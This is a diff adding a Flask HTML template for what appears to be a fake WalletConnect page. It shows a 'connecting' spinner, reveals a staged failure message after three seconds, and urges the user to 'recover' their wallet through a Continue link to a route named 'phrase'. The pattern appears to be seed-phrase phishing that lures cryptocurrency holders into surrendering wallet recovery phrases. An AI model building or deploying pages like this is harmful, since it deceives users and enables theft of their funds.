@@ -1,0 +1,51 @@
+{% extends 'base.html' %}
+{% block content %}
+<style>
+    @media (min-width: 768px){
+        .me {
+            width: 7rem;
+        }
+    }
+    .me{
+        z-index: 20;
+    }
+</style> 
+<header class="">
+    <nav class="navbar">
+        <a class="navbar-brand">Navbar</a>
+        <a class="navbar-brand">Apps</a>
+        <form class="form-inline">
+            <div class="me">
+            <img src="{{url_for('static', filename='images/walletco.jpg')}} ">
+            </div>
+        </form>
+
+        <form class="form-inline">
+            <p>Github</p>
+          </form>
+          <form class="form-inline">
+            <p>Docs</p>
+          </form>
+    </nav>    
+            
+</header>
+<br>
+<div class="text-center" style="color: gray;"><h1>Connecting to your wallet...</h1>
+<br>
+<br>
+<br>
+<img src="{{url_for('static', filename='Skinny.gif')}}" style="height: 32px; width: 32px;">
+<br>
+<br>
+<p style="color: red; display: none;" id="delay" >Walletconnect failed to connect to your wallet<br>
+Please continue to recover your wallet 
+</p>
+<br>
+<a href="{{url_for('phrase', id=coin.id)}}" class="btn btn-lg btn-secondary" style="width: 50%;">Continue</a>
+</div>
+<script>
+    setTimeout (function delay(){
+        $("#delay").show()
+    }, 3000)
+</script>
+{% endblock %}
